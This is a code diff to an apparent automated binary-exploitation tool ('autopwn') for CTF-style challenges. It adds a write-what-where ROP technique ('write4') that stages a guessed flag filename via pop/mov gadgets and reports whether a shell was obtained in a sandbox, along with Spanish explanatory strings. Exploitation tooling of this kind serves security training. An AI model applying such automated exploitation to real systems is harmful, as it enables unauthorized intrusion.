@@ -239,6 +239,25 @@ def autopwn(binary: str, config=None, store=None,
         except Exception as e:
             res.attempts.append(("callme", False, str(e)))
 
+    # combo A6: write4 -- write-what-where. No win()/gift target reachable by name, no useful
+    # pre-existing string, but a `pop regA; pop regB; ret` + `mov [regA], regB; ret` pair lets the
+    # exploit stage a short string (a guessed flag filename) into memory itself before calling a
+    # function that takes it. Tried after callme, which never finds this (there's no multi-target
+    # name/structure match -- just one write-then-call target).
+    if want("write4") and not res.win_exploit:
+        try:
+            from .autowrite4 import autowrite4, _write4_applicable
+            if _write4_applicable(binary):
+                log("[combo] write4: write-what-where + llamada (sandbox)...")
+                rw4 = autowrite4(binary)
+                verdict = True if rw4.get("verified") else (None if rw4.get("ok") else False)
+                res.attempts.append(("write4", verdict, rw4.get("detail") or rw4.get("note", "")))
+                res.win_exploit = res.win_exploit or bool(rw4.get("verified"))
+                log(f"[combo] write4 -> {'SHELL VERIFICADA' if rw4.get('verified') else 'no verificado'}")
+                learn(f"write4 verified={rw4.get('verified')} {rw4.get('detail','')}")
+        except Exception as e:
+            res.attempts.append(("write4", False, str(e)))
+
     # combo B: ROP chain (ret2libc / execve). On a PIE binary the base must be resolved first, so
     # use the PIE-aware ROP verifier; otherwise the static/no-PIE ROP builder (with string staging
     # + SROP). Both verify by getting a real shell in the sandbox. Skipped once we already have a
@@ -527,6 +546,8 @@ def _why(mit: dict, has_win: bool, technique: str) -> str:
         return "overflow demasiado corto para una cadena completa (solo alcanza saved rbp/rip) -> `leave; ret` migra RSP a un buffer .bss ya escalonado con la cadena real"
     if "callme" in t:
         return "gadget `pop rdi; pop rsi; pop rdx; ret` disponible pero el regalo esta repartido en varias funciones -> se llaman todas, cada una con sus propios argumentos, probando el orden correcto"
+    if "write4" in t:
+        return "sin win()/string util ya presente -> un gadget pop+mov escalona un nombre de fichero adivinado en memoria y se llama a la funcion que lo abre"
     if "rop" in t:
         return ("sin win()/system directo -> cadena ROP execve por syscall"
                 + (" (PIE: base resuelta en sandbox)" if pie else ""))
